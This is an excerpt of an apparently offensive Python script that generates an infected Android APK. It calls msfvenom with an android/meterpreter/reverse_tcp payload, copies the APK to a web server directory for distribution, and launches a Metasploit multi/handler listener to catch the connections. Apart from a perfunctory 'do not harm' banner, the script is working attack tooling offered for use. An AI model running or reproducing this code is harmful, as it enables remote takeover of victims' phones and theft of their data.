...
print(f"\n{color.RED} This is Android Apk Pyload And Listener Generator Do not harm Some One !! {color.RED} ")
...
os.system(
            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > {app_name}.apk"
        )
print(f"\n{color.GREEN}Upload The Infected APP on Your Web server..............")
os.system(
           f"cp -r {app_name}.apk /var/www/html"
)
...
os.system(
          f"sudo xterm -hold -fa monaco -fs 7 -bg black -e msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'"
          )
